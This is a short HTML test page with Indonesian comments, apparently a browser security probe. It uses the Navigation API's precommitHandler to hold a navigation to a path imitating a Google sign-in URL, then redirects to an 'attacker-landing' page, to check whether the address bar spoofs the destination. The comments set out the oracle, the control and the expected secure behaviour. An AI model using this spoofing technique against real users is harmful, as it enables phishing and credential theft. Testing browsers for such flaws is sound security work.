<!doctype html><meta charset=utf-8>
<!-- PREDIKAT: bar melukis URL yang diminta selama penundaan, lalu mendarat di URL LAIN tanpa bar ikut jujur
     ORACLE: klik go -> screenshot bar pada detik 1 (masih ditunda) dan setelah mendarat
     CONTROL: hapus precommitHandler, sisakan navigate() saja
     EXPECTED-SECURE: bar tak melukis tujuan sebelum commit, dan setelah redirect ia menyebut tujuan AKHIR
     [UNVERIFIED] bentuk persis precommitHandler berubah antar-versi - baca error di console, jangan tebak -->
<button onclick="go()">go</button>
<pre id=p></pre>
<script>
const SHOW = '/accounts.google.com/signin/identifier', LAND = '/attacker-landing', MS = 2500;
function log(s){ p.textContent = 'REAL: ' + location.href + '\n' + s; }
if (!self.navigation) log('Navigation API tidak ada = INERT (catat).');
else navigation.addEventListener('navigate', e => { if (!e.canIntercept) return;
  try { e.intercept({ precommitHandler: c => new Promise(r => setTimeout(() => { c.redirect(LAND); r(); }, MS)) }); }
  catch (err) { log('intercept ditolak: ' + err.name + ' - ' + err.message); } });
function go(){ try { navigation.navigate(SHOW); log('ditunda ' + MS + 'ms - LIHAT BAR SEKARANG'); }
  catch (err) { log('navigate ditolak: ' + err.name); } }
log('siap');
</script>
